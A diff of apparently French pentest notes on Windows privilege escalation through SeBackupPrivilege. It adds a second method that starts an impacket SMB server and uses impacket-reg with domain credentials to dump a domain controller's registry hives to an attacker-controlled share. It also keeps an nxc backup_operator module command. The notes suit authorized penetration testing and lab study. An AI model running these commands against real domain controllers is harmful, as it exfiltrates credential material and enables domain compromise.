@@ -1,5 +1,5 @@
 
-ref: https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
+Ref: https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
 
 
 
@@ -22,4 +22,12 @@ Les 2 droits à identifier :
 nxc smb <IP-DC> -u <USER> -p <PASS> -M backup_operator
 ```
 
-Methode 2: 
+Methode 2: impact-reg + SMB server 
+```
+impacket-smbserver share $(pwd) -smb2support
+```
+
+```
+impacket-reg "<DOMAIN_NAME>"/"<USER>":"<PASS>"@"<IP-DC>" backup -o '\\<IP-share>\share'
+```
+
